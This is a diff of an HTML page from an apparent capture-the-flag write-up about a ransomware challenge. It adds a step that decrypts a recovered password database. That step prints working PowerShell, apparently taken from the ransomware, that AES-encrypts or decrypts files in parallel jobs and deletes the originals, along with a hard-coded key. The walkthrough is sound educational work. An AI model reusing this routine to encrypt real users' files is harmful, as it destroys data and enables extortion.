+       <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="nv">$File</span> <span class="p">+</span> <span class="nv">$Suffix</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$File</span> <span class="o">-replace</span> <span class="nv">$Suffix</span><span class="p">)}</span>
+       <span class="nv">$FileSW</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$DestFile</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Create</span><span class="p">)</span>
+       <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
+           <span class="nv">$AESP</span><span class="p">.</span><span class="n">GenerateIV</span><span class="p">()</span>
+           <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span> <span class="n">0</span><span class="p">,</span> <span class="n">4</span><span class="p">)</span>
+           <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+           <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">()</span>
+       <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+           <span class="no">[Byte[]]</span><span class="nv">$LenIV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">4</span>
+           <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+           <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">,</span> <span class="n">3</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+           <span class="no">[Int]</span><span class="nv">$LIV</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">)</span>
+           <span class="no">[Byte[]]</span><span class="nv">$IV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$LIV</span>
+           <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">4</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+           <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$LIV</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+           <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="nv">$IV</span>
+           <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">()</span>
+       <span class="p">}</span>
+       <span class="nv">$CryptoS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">CryptoStream</span><span class="p">(</span><span class="nv">$FileSW</span><span class="p">,</span> <span class="nv">$Transform</span><span class="p">,</span> <span class="no">[System.Security.Cryptography.CryptoStreamMode]</span><span class="p">::</span><span class="n">Write</span><span class="p">)</span>
+       <span class="no">[Int]</span><span class="nv">$Count</span> <span class="p">=</span> <span class="n">0</span>
+       <span class="no">[Int]</span><span class="nv">$BlockSzBts</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="n">8</span>
+       <span class="no">[Byte[]]</span><span class="nv">$Data</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$BlockSzBts</span>
+       <span class="k">Do</span>
+       <span class="p">{</span>
+           <span class="nv">$Count</span> <span class="p">=</span> <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$BlockSzBts</span><span class="p">)</span>
+           <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Count</span><span class="p">)</span>
+       <span class="p">}</span>
+       <span class="k">While</span> <span class="p">(</span><span class="nv">$Count</span> <span class="o">-gt</span> <span class="n">0</span><span class="p">)</span>
+       <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">()</span>
+       <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+       <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+       <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+       <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;key&quot;</span>
+       <span class="nb">Remove-Item</span> <span class="nv">$File</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="k">function</span> <span class="n">enc_dec</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">,</span> <span class="nv">$make_cookie</span> <span class="p">)</span>
+   <span class="nv">$tcount</span> <span class="p">=</span> <span class="n">12</span>
+   <span class="k">for</span> <span class="p">(</span> <span class="nv">$file</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$file</span> <span class="o">-lt</span> <span class="nv">$allfiles</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="nv">$file</span><span class="p">++</span>  <span class="p">)</span> <span class="p">{</span>
+       <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
+           <span class="nv">$running</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">Get-Job</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-eq</span> <span class="s1">&#39;Running&#39;</span> <span class="p">})</span>
+           <span class="k">if</span> <span class="p">(</span><span class="nv">$running</span><span class="p">.</span><span class="n">Count</span> <span class="o">-le</span> <span class="nv">$tcount</span><span class="p">)</span> <span class="p">{</span>
+               <span class="nb">Start-Job</span>  <span class="n">-ScriptBlock</span> <span class="p">{</span>
+                   <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$true_false</span><span class="p">)</span>
+                   <span class="k">try</span><span class="p">{</span>
+                       <span class="n">Enc_Dec</span><span class="o">-File</span> <span class="nv">$key</span> <span class="nv">$File</span> <span class="nv">$true_false</span>
+                   <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+                       <span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="p">$(</span><span class="s1">&#39;E:\Temp&#39;</span><span class="p">+</span><span class="s1">&#39;\ps_log.txt&#39;</span><span class="p">)</span> <span class="n">-append</span>
+                   <span class="p">}</span>
+               <span class="p">}</span> <span class="n">-args</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">[</span><span class="nv">$file</span><span class="p">],</span> <span class="nv">$make_cookie</span> <span class="n">-InitializationScript</span> <span class="nv">$functions</span>
+               <span class="k">break</span>
+           <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+               <span class="nb">Start-Sleep</span> <span class="n">-m</span> <span class="n">200</span>
+               <span class="k">continue</span>
+           <span class="p">}</span>
+       <span class="p">}</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">)</span>
+   <span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>
+   <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span>
+       <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$akey</span> <span class="p">=</span> <span class="s1">&#39;fbcfc121915d99cc20a3d3d5d84f8308&#39;</span>
+
+<span class="nv">$akey</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$akey</span><span class="p">)</span>
+<span class="no">[array]</span><span class="nv">$allcookies</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="s2">&quot;E:\Temp&quot;</span> <span class="n">-Recurse</span>  <span class="n">-Filter</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">})</span>
+<span class="n">enc_dec</span> <span class="nv">$akey</span> <span class="nv">$allcookies</span> <span class="nv">$false</span>
+</pre></div>
+</td></tr></table></div>
+<p>The result of running this code was the unencrypted file called <code class="docutils literal notranslate"><span class="pre">alabaster_passwords.elfdb</span></code>.</p>
+</div>
+<div class="section" id="step-7-extract-the-vault-password">
+<h3>Step 7: Extract the vault password<a class="headerlink" href="#step-7-extract-the-vault-password" title="Permalink to this headline">¶</a></h3>
+<p>The next step was to try and work out what type of file the <code class="docutils literal notranslate"><span class="pre">alabaster_passwords.elfdb</span></code> was. We found the simplest way to work this out was to open the file in a text editor and look at the initial characters. This provided the string <code class="docutils literal notranslate"><span class="pre">SQLite</span> <span class="pre">format</span> <span class="pre">3</span></code>.</p>
 <div class="admonition note">
 <p class="first admonition-title">Note</p>
 <p class="last">A quick examination of the file using a text editor revealed a couple of passwords but the parts of the file that were important consisted of binary data.</p>
@@ -205,6 +686,7 @@
 </div>
 </div>
 </div>
+</div>
 
 
            </div>
@@ -214,10 +696,10 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="question13.html" class="btn btn-neutral float-right" title="Question 13" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="question13.html" class="btn btn-neutral float-right" title="Question 13: Santa’s Door" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
-        <a href="question11.html" class="btn btn-neutral" title="Question 11" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+        <a href="question11.html" class="btn btn-neutral" title="Question 11: Stop the Malware" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
       
     </div>
   
@@ -229,8 +711,7 @@
         &copy; Copyright 2019, Antonios and Peter Lapornik
 
     </p>
-  </div>
-  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+  </div> 
 
 </footer>
 
